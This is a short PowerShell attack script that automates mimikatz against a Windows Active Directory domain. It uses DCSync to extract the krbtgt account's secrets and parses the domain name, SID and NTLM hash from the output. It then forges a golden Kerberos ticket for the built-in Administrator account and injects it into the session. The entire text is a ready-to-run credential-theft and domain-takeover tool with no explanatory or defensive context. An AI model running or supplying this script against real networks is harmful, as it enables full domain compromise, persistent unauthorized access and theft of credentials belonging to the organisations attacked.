cd C:\Users\Administrator\Downloads #path to mimikatz
$(
	.\x64\mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
) *>&1 > output.txt

$tdomain = Get-Content .\output.txt | findstr Salt |Select-Object -first 1| %{ $_.Split(':')[1] ; }| %{ $_.Split('krbtgt')[0] ; }| %{ $_.Split(' ')[1] ; }
$sid = Get-Content .\output.txt | findstr Object | findstr Security | %{ $_.Split(':')[1] ; } | %{ $_.Split(' ')[1] ; }
$ntlm = Get-Content .\output.txt | findstr Hash| findstr NTLM| %{ $_.Split(':')[1] ; } | %{ $_.Split(' ')[1] ; }

.\x64\mimikatz.exe privilege::debug "kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt" exit
